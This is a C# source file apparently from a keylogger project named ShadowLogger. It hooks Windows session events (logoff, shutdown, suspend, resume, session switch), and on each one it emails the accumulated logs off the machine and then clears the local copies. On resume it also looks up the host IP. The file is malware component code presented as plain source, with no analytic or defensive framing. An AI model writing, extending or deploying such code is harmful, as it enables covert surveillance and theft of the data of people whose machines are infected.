using System;
using System.Threading;
using Microsoft.Win32;
using ShadowLogger.bin.Shared_Methods;

namespace ShadowLogger.bin.System_EventHandlers
{
   internal static class Handlers
    {
       internal static void SessionEnding(object sender, SessionEndingEventArgs e)
        {
            switch (e.Reason)
            {
                case SessionEndReasons.Logoff:
                    EventHandling("Logoff Event");
                    break;
                case SessionEndReasons.SystemShutdown:
                    EventHandling("Shutdown Event");
                    break;
            }
        }

       internal static void PowerModeChanged(object sender, PowerModeChangedEventArgs e)
        {
            switch (e.Mode)
            {
                case PowerModes.Resume:
                    EventHandling("Resume Event");
                    Thread t = new Thread(HostInfo.HostInfo.GetIp);
                    t.Start();
                    break;
                case PowerModes.Suspend:
                    EventHandling("Suspend Event");
                    GlobalVariables.GlobalVariables.HostIp = string.Empty;
                    break;
            }
        }

       internal static void SessionSwitch(object sender, SessionSwitchEventArgs e)
        {
           EventHandling(Enum.GetName((typeof (SessionSwitchReason)), e.Reason) + " Event");
           GlobalVariables.GlobalVariables.HostIp = string.Empty;
        }

        private static void EventHandling(string sessionevent)
        {
            SharedMethods.SendMail(string.Format(SharedMethods.GetMailSubject(), " - ## " + sessionevent + " ## - Logs of ### "));
            SharedMethods.ClearLogs();
        }
    }
}
